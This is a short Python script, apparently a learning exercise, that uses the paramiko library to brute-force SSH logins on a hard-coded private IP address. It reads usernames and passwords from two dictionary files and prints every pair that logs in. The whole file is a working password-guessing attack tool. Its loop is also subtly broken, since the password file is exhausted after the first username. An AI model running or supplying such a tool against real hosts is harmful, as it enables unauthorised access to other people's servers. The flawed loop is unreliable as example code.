"""
   python paramiko模块简介: https://www.cnblogs.com/qianyuliang/p/6433250.html

"""
import paramiko
SSHServer ="192.168.157.156"
UserDic="small.txt"
PasswordDic="pass.txt"
def  Login(SSHServer, userName, passwords):
    try:
        s = paramiko.SSHClient()
        s.set_missing_host_key_policy(paramiko.AutoAddPolicy())
        s.connect(SSHServer,22,userName, passwords,timeout=1)
        s.close()
        print(("The userName is %s and password is %s" %(userName,passwords)))
    except:  
        pass
userNameFile= open(UserDic,"r")
passWordsFile = open(PasswordDic,"r")  
for user in userNameFile.readlines():  
     for passwd in passWordsFile.readlines():  
            un = user.strip('\n')  
            pw = passwd.strip('\n')
            Login(SSHServer, un, pw)